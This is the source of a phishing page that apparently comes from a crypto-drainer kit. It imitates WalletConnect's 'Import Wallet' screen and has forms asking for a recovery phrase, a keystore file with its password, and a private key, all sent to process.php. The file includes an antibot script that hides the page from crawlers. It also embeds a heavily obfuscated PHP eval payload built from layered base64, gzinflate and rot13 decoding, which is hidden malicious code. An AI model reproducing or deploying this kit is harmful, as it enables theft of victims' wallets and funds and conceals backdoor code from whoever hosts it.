<html>
<meta http-equiv="content-type" content="text/html" />
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./files/main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./files/images/logo.svg">
  <link rel="icon" href="./files/images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="./files/walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="pass" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="key" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
	<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
  </body>
</html>








<script src="./files/jquery.min.js.download"></script>

    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

